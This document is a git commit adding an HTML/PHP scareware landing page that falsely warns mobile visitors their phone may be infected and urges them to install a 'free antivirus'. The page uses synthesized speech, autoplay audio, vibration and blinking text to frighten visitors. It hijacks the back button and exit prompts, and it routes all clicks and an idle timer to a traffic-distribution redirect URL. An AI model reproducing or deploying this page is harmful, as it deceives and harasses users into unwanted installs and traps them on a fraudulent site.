abe488649ee9e6e2f342797bb96a43865bd2b820
Bokichga <77746292+Bokichga@users.noreply.github.com>
2021-06-02 16:08:22 +0300

    Add files via upload

---
+++ index (1).php
@@ -0,0 +1,764 @@
+<html><head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style type="text/css">html {
+        font-family: sans-serif;
+        -ms-text-size-adjust: 100%;
+        -webkit-text-size-adjust: 100%
+    }
+
+    body {
+        margin: 0
+    }
+
+    article, aside, details, figcaption, figure, footer, header, hgroup, main, menu, nav, section, summary {
+        display: block
+    }
+
+    audio, canvas, progress, video {
+        display: inline-block;
+        vertical-align: baseline
+    }
+
+    audio:not([controls]) {
+        display: none;
+        height: 0
+    }
+
+    [hidden], template {
+        display: none
+    }
+
+    a {
+        background-color: transparent
+    }
+
+    a:active, a:hover {
+        outline: 0
+    }
+
+    abbr[title] {
+        border-bottom: 1px dotted
+    }
+
+    b, strong {
+        font-weight: 700
+    }
+
+    dfn {
+        font-style: italic
+    }
+
+    h1 {
+        font-size: 2em;
+        margin: .67em 0
+    }
+
+    mark {
+        background: #ff0;
+        color: #fff
+    }
+
+    small {
+        font-size: 80%
+    }
+
+    sub, sup {
+        font-size: 75%;
+        line-height: 0;
+        position: relative;
+        vertical-align: baseline
+    }
+
+    sup {
+        top: -.5em
+    }
+
+    sub {
+        bottom: -.25em
+    }
+
+    img {
+        border: 0
+    }
+
+    svg:not(:root) {
+        overflow: hidden
+    }
+
+    figure {
+        margin: 1em 40px
+    }
+
+    hr {
+        -moz-box-sizing: content-box;
+        box-sizing: content-box;
+        height: 0
+    }
+
+    pre {
+        overflow: auto
+    }
+
+    code, kbd, pre, samp {
+        font-family: monospace, monospace;
+        font-size: 1em
+    }
+
+    button, input, optgroup, select, textarea {
+        color: inherit;
+        font: inherit;
+        margin: 0
+    }
+
+    button {
+        overflow: visible
+    }
+
+    button, select {
+        text-transform: none
+    }
+
+    button, html input[type=button], input[type=reset], input[type=submit] {
+        -webkit-appearance: button;
+        cursor: pointer
+    }
+
+    button[disabled], html input[disabled] {
+        cursor: default
+    }
+
+    button::-moz-focus-inner, input::-moz-focus-inner {
+        border: 0;
+        padding: 0
+    }
+
+    input {
+        line-height: normal
+    }
+
+    input[type=checkbox], input[type=radio] {
+        box-sizing: border-box;
+        padding: 0
+    }
+
+    input[type=number]::-webkit-inner-spin-button, input[type=number]::-webkit-outer-spin-button {
+        height: auto
+    }
+
+    input[type=search] {
+        -webkit-appearance: textfield;
+        -moz-box-sizing: content-box;
+        -webkit-box-sizing: content-box;
+        box-sizing: content-box
+    }
+
+    input[type=search]::-webkit-search-cancel-button, input[type=search]::-webkit-search-decoration {
+        -webkit-appearance: none
+    }
+
+    fieldset {
+        border: 1px solid silver;
+        margin: 0 2px;
+        padding: .35em .625em .75em
+    }
+
+    legend {
+        border: 0;
+        padding: 0
+    }
+
+    textarea {
+        overflow: auto
+    }
+
+    optgroup {
+        font-weight: 700
+    }
+
+    table {
+        border-collapse: collapse;
+        border-spacing: 0
+    }
+
+    td, th {
+        padding: 0
+    }</style>
+
+
+
+    <title>
+        Attention! </title>
+
+
+    <style type="text/css">
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: auto;
+            height: 100%;
+        }
+
+        body {
+            font-family: -apple-system, "Roboto", Trebuchet MS, sans-serif;
+            font-size: 1em;
+            line-height: 1.2em;
+            color: #fff;
+            background-color: #fff;
+        }
+
+        a, img {
+            border: 0;
+            outline: none;
+        }
+
+        a {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        h1, p {
+            margin: 0;
+            padding: 0;
+        }
+
+        h1 {
+            margin-bottom: 9px;
+            font-weight: bold;
+            font-size: 130%;
+            line-height: 100%;
+        }
+
+        .wrap {
+            position: relative;
+            margin: 0 auto;
+            width: auto;
+            min-width: 240px;
+            max-width: 100%;
+            height: 100%;
+            min-height: 240px;
+            overflow: hidden;
+
+            background-position: center top;
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+
+        .pagelink {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            width: auto;
+            height: auto;
+        }
+
+        .description {
+            position: absolute;
+            left: 5px;
+            right: 5px;
+            top: 5px;
+            bottom: 5px;
+            color: #fff;
+            text-align: left;
+            white-space: normal;
+            overflow: hidden;
+        }
+
+        .window {
+            position: absolute;
+            left: 0;
+            right: 0;
+            top: 50%;
+            width: 84.4%;
+            min-width: 240px;
+            max-width: 270px;
+            margin: auto;
+            /*text-align: center;*/
+            border-radius: 12px;
+            background-color: #424242;
+
+            -webkit-transform: translate(0, -50%);
+            -moz-transform: translate(0, -50%);
+            transform: translate(0, -50%);
+        }
+
+        .text {
+            margin: 7.6% 7% 8% 7%;
+        }
+
+        .buttons, .button {
+            margin: 0;
+            text-align: center;
+        }
+
+        .buttons {
+            position: relative;
+            height: auto;
+            min-height: 45px;
+            color: #fff;
+            font-weight: bold;
+            font-size: 130%;
+            border-top: 1px solid #b4b4b4;
+            white-space: nowrap;
+        }
+
+        .buttons:after {
+            content: "";
+            display: block;
+            position: absolute;
+            left: 50%;
+            top: 0;
+            bottom: 0;
+            width: 0;
+            height: auto;
+            font-size: 0;
+            line-height: 0;
+            border: 0;
+            border-left: 1px solid #b4b4b4;
+            overflow: hidden;
+        }
+
+        .button {
+            display: inline-block;
+
+            margin: 0px auto;
+            padding: 15px 3%;
+            width: 43%;
+            color: #fff;
+            text-align: center;
+            white-space: normal;
+        }
+
+        @supports (display: -webkit-box) or (display: -moz-box) or (display: -webkit-flex) or (display: flex) {
+            .buttons, .button {
+                display: -webkit-box;
+                display: -moz-box;
+                display: -webkit-flex;
+                display: flex;
+
+                -webkit-flex-direction: row;
+                -moz-flex-direction: row;
+                flex-direction: row;
+
+                -webkit-flex-wrap: nowrap;
+                -moz-flex-wrap: nowrap;
+                flex-wrap: nowrap;
+
+                -webkit-justify-content: space-between;
+                -moz-justify-content: space-between;
+                justify-content: space-between;
+
+                -webkit-align-items: stretch;
+                -moz-flex-align: stretch;
+                align-items: stretch;
+
+                -webkit-align-content: stretch;
+                -moz-flex-line-pack: stretch;
+                align-content: stretch;
+
+                -webkit-box-align: stretch;
+                -moz-box-align: stretch;
+                box-align: stretch;
+
+                -webkit-box-pack: center;
+                -moz-box-pack: center;
+                box-pack: center;
+
+                -webkit-box-direction: normal;
+                -moz-box-direction: normal;
+                box-direction: normal;
+
+                -webkit-box-orient: vertical;
+                -moz-box-orient: vertical;
+                box-orient: vertical;
+            }
+
+            .button {
+                -webkit-flex-direction: column;
+                -moz-flex-direction: column;
+                flex-direction: column;
+
+                -webkit-justify-content: center;
+                -moz-justify-content: center;
+                justify-content: center;
+            }
+
+            .button span {
+                -webkit-box-flex: 0 1 auto;
+                -moz-box-flex: 0 1 auto;
+                -webkit-flex: 0 1 auto;
+                flex: 0 1 auto;
+
+                -webkit-order: 0;
+                -moz-order: 0;
+                order: 0;
+            }
+        }
+
+        /* ************************************************************************* */
+
+        @media screen and (orientation: portrait) and (max-width: 450px) {
+            h1 {
+                margin-bottom: 2px;
+                line-height: 106%;
+            }
+
+            .text {
+                margin: 7.5% 6.7% 8% 6.7%;
+            }
+        }
+
+        @media screen and (orientation: portrait) and (max-width: 400px) {
+            h1 {
+                margin-bottom: 3px;
+                font-size: 128%;
+                line-height: 112%;
+            }
+
+            .text {
+                margin: 7.4% 6.4% 8% 6.4%;
+            }
+        }
+
+        @media screen and (orientation: portrait) and (max-width: 375px) {
+            h1 {
+                margin-bottom: 4px;
+                line-height: 118%;
+            }
+
+            .text {
+                margin: 7.3% 6.1% 8% 6.1%;
+            }
+
+            .buttons {
+                min-height: 49px;
+            }
+        }
+
+        @media screen and (orientation: portrait) and (max-width: 350px) {
+            h1 {
+                margin-bottom: 5px;
+                font-size: 129%;
+                line-height: 124%;
+            }
+
+            .text {
+                margin: 7.2% 5.8% 8% 5.8%;
+            }
+
+            .buttons {
+                min-height: 46px;
+            }
+        }
+
+        @media screen and (orientation: portrait) and (max-width: 325px) {
+            body {
+                font-size: 0.84em;
+            }
+
+            h1 {
+                margin-bottom: 6px;
+                font-size: 130%;
+                line-height: 130%;
+            }
+
+            .text {
+                margin: 7% 5.6% 8% 5.6%;
+            }
+
+            .buttons {
+                min-height: 41px;
+            }
+
+            .button {
+                line-height: 65%;
+            }
+        }
+
+        @media screen and (orientation: portrait) and (max-width: 300px) {
+            body {
+                font-size: 0.77em;
+            }
+        }
+
+        @media screen and (orientation: portrait) and (max-width: 275px) {
+            body {
+                font-size: 0.7em;
+            }
+        }
+
+        @media screen and (orientation: portrait) and (max-width: 250px) {
+            body {
+                font-size: 0.63em;
+            }
+        }
+
+        /* ************************************************************************* */
+
+        @media screen and (orientation: landscape) and (max-height: 450px) {
+            h1 {
+                margin-bottom: 2px;
+                line-height: 106%;
+            }
+
+            .text {
+                margin: 6.5% 7% 7% 7%;
+            }
+        }
+
+        @media screen and (orientation: landscape) and (max-height: 400px) {
+            h1 {
+                margin-bottom: 3px;
+                font-size: 128%;
+                line-height: 112%;
+            }
+
+            .text {
+                margin: 5.5% 7% 6% 7%;
+            }
+        }
+
+        @media screen and (orientation: landscape) and (max-height: 375px) {
+            h1 {
+                margin-bottom: 4px;
+                line-height: 118%;
+            }
+
+            .text {
+                margin: 4.5% 7% 5% 7%;
+            }
+
+            .buttons {
+                min-height: 49px;
+            }
+        }
+
+        @media screen and (orientation: landscape) and (max-height: 350px) {
+            h1 {
+                margin-bottom: 5px;
+                font-size: 129%;
+                line-height: 124%;
+            }
+
+            .text {
+                margin: 3.5% 7% 4% 7%;
+            }
+
+            .buttons {
+                min-height: 46px;
+            }
+        }
+
+        @media screen and (orientation: landscape) and (max-height: 325px) {
+            body {
+                font-size: 0.84em;
+            }
+
+            h1 {
+                margin-bottom: 6px;
+                font-size: 130%;
+                line-height: 130%;
+            }
+
+            .text {
+                margin: 2.5% 7% 3% 7%;
+            }
+
+            .buttons {
+                min-height: 41px;
+            }
+
+            .button {
+                line-height: 65%;
+            }
+        }
+
+        @media screen and (orientation: landscape) and (max-height: 300px) {
+            body {
+                font-size: 0.77em;
+            }
+        }
+
+        @media screen and (orientation: landscape) and (max-height: 275px) {
+            body {
+                font-size: 0.7em;
+            }
+        }
+
+        @media screen and (orientation: landscape) and (max-height: 250px) {
+            body {
+                font-size: 0.63em;
+            }
+        }
+
+        .blink_me {
+            animation: blinker 1s linear infinite;
+        }
+
+        @keyframes blinker {
+            50% { opacity: 0.3; color: red; }
+        }
+    </style>
+
+    <script>
+        function getURLParameter(name) {
+            return decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+        }
+    </script>
+
+
+<script type="text/javascript">
+function speak(text) {
+var msg = new SpeechSynthesisUtterance();
+var voices = speechSynthesis.getVoices();
+msg.voice = voices[6];
+msg.voiceURI = 'native';
+msg.volume = 1;
+msg.rate = 1;
+msg.pitch = 1;
+msg.text = text;
+msg.lang = 'en-GB';
+speechSynthesis.speak(msg);}
+
+speak('System cleanup required! Please click Install to install cleaning app for FREE and clean your phone');</script>
+
+ <script>
+
+        function contains(string, fragment) {
+            string = string.toLowerCase();
+            fragment = fragment.toLowerCase();
+            return string.indexOf(fragment) !== -1;
+        }
+
+        function getURLParameter(name) {
+            var result = decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+
+            if(name.indexOf('brand') !== -1 && contains(result, 'generic')) {
+                result = 'phone'
+            }
+
+            if(name.indexOf('model') !== -1 && contains(result, 'android')) {
+                result = 'android'
+            }
+
+            if(name.indexOf('browser') !== -1 && contains(result, 'android')) {
+                result = 'Internet Browser'
+            }
+
+            return result;
+
+        }
+
+    </script>
+
+</head>
+<script type="text/javascript"> var PreventExitPop = true;function ExitPop() {if(PreventExitPop != false) {return "";}}window.onbeforeunload = ExitPop; </script>
+<script type="text/javascript">
+! function() {
+	var t;
+	try {
+		for(t = 0; 10 > t; ++t) history.pushState({}, "", "");
+		onpopstate = function(t) {
+			PreventExitPop = false
+			t.state && location.replace("https://tdstraffic.xyz/click.php?lp=1&place=back")
+		}
+	} catch(o) {}
+}();
+</script>
+<body class="en ltr" onclick="goto();">
+	<script>
+	function goto() {
+		window.onbeforeunload = null;
+		location.href = "https://tdstraffic.xyz/click.php?lp=1&place=body"
+	}
+	</script>
+
+<div class="wrap">
+    <div class="window">
+        <div class="text">
+
+
+            <h1 style="" class="blink_me">
+              Your <script>document.write(getURLParameter("brand"))</script> has a virus?</h1>
+            <p>
+               Find out if your <script>document.write(getURLParameter("brand"))</script> is infected or not.</p>
+            <br>
+            <p>And protect your mobile from virus and hacker attacks.</p>
+            <br>
+            <img src="icon.png" width="50" height="50" style="float: left; padding-right: 10px">
+            <p>Install a free antivirus on your <script>document.write(getURLParameter("brand"))</script>!</p>
+            <br>
+
+        </div>
+        <div class="buttons">
+            <a class="button exitpoint" href="https://tdstraffic.xyz/click.php?lp=1&place=in">
+				<span>
+																INSTALL							</span>
+            </a>
+            <a class="button cancel" href="https://tdstraffic.xyz/click.php?lp=1&place=C">
+				<span>
+																CANCEL							</span>
+            </a>
+        </div>
+    </div>
+
+</div>
+
+<audio autoplay="autoplay" preload="">
+    <source src="default.mp3" type="audio/mpeg">
+    <source src="default.ogg" type="audio/ogg">
+</audio>
+
+
+	</script>
+	<script type="text/javascript">
+	PreventExitPop = false;
+	setTimeout(() => location.replace("https://tdstraffic.xyz/click.php?lp=1&place=afk"), 600000);
+	</script>
+	<script type="text/javascript">
+	(function(nv) {
+		nv.vibrate = nv.vibrate || nv.webkitVibrate || nv.mozVibrate || nv.msVibrate;
+		nv.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000]);
+	})(navigator);
+	</script>
+<!-- Code injected by live-server -->
+<script type="text/javascript">
+	// <![CDATA[  <-- For SVG support
+	if ('WebSocket' in window) {
+		(function () {
+			function refreshCSS() {
+				var sheets = [].slice.call(document.getElementsByTagName("link"));
+				var head = document.getElementsByTagName("head")[0];
+				for (var i = 0; i < sheets.length; ++i) {
+					var elem = sheets[i];
+					var parent = elem.parentElement || head;
+					parent.removeChild(elem);
+					var rel = elem.rel;
+					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+					}
+					parent.appendChild(elem);
+				}
+			}
+			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+			var address = protocol + window.location.host + window.location.pathname + '/ws';
+			var socket = new WebSocket(address);
+			socket.onmessage = function (msg) {
+				if (msg.data == 'reload') window.location.reload();
+				else if (msg.data == 'refreshcss') refreshCSS();
+			};
+			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+				console.log('Live reload enabled.');
+				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+			}
+		})();
+	}
+	else {
+		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+	}
+	// ]]>
+</script></body></html>
